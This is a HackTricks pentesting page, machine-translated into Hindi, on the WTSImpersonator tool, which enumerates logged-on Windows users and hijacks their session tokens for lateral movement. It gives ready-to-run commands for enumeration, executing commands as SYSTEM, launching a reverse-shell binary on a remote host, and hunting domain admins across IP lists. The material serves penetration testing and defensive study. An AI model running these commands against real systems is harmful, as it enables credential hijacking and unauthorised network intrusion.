{{#include ../../banners/hacktricks-training.md}}

**WTS Impersonator** उपकरण **"\\pipe\LSM_API_service"** RPC नामित पाइप का उपयोग करके चुपचाप लॉग इन उपयोगकर्ताओं की गणना करता है और उनके टोकन को हाईजैक करता है, पारंपरिक टोकन अनुकरण तकनीकों को बायपास करता है। यह दृष्टिकोण नेटवर्क के भीतर निर्बाध पार्श्व आंदोलनों को सुविधाजनक बनाता है। इस तकनीक के पीछे की नवाचार **Omri Baso** को श्रेय दिया जाता है, cuyo काम [GitHub](https://github.com/OmriBaso/WTSImpersonator) पर उपलब्ध है।

### मुख्य कार्यक्षमता

उपकरण API कॉल की एक श्रृंखला के माध्यम से कार्य करता है:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Key Modules and Usage

- **उपयोगकर्ताओं की गणना**: इस उपकरण के साथ स्थानीय और दूरस्थ उपयोगकर्ता गणना संभव है, किसी भी परिदृश्य के लिए आदेशों का उपयोग करते हुए:

- स्थानीय रूप से:
```powershell
.\WTSImpersonator.exe -m enum
```
- दूरस्थ रूप से, एक IP पता या होस्टनाम निर्दिष्ट करके:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **आदेश निष्पादित करना**: `exec` और `exec-remote` मॉड्यूल को कार्य करने के लिए एक **Service** संदर्भ की आवश्यकता होती है। स्थानीय निष्पादन के लिए केवल WTSImpersonator निष्पादन योग्य और एक आदेश की आवश्यकता होती है:

- स्थानीय आदेश निष्पादन का उदाहरण:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe का उपयोग सेवा संदर्भ प्राप्त करने के लिए किया जा सकता है:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **दूरस्थ आदेश निष्पादन**: PsExec.exe के समान दूरस्थ रूप से एक सेवा बनाने और स्थापित करने में शामिल है, जो उचित अनुमतियों के साथ निष्पादन की अनुमति देता है।

- दूरस्थ निष्पादन का उदाहरण:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **उपयोगकर्ता शिकार मॉड्यूल**: कई मशीनों में विशिष्ट उपयोगकर्ताओं को लक्षित करता है, उनके क्रेडेंशियल के तहत कोड निष्पादित करता है। यह विशेष रूप से कई सिस्टम पर स्थानीय प्रशासनिक अधिकारों के साथ डोमेन प्रशासकों को लक्षित करने के लिए उपयोगी है।
- उपयोग का उदाहरण:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

{{#include ../../banners/hacktricks-training.md}}
